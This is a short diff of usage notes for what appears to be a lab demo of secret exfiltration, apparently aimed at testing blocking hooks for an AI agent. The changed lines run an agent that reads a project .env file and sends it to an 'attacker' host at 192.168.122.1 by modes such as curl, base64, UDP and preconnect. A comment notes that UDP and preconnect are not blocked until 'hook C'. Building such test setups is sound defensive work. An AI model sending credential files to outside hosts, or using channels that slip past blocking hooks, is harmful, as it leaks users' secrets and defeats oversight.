@@ -128,8 +128,8 @@ npm start -- --bridge=ws://<vm-ip>:8765 --kiosk
 # Demo (VM, except attacker which runs on the host)
 python3 demo/internal_api.py --port 8080
 python3 demo/attacker.py --port 9999                        # host laptop
-python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest \
-  --target 192.168.122.1:9999 --exfil direct|curl|udp|b64|preconnect|none [--step]
+python3 demo/agent.py --mode direct|curl|b64|ipv6|udp|preconnect --env demo/project/.env \
+  --attacker 192.168.122.1 --port 9999 --api http://127.0.0.1:8080   # udp, preconnect: NOT BLOCKED until hook C
 demo/reset.sh
 
 # Tests
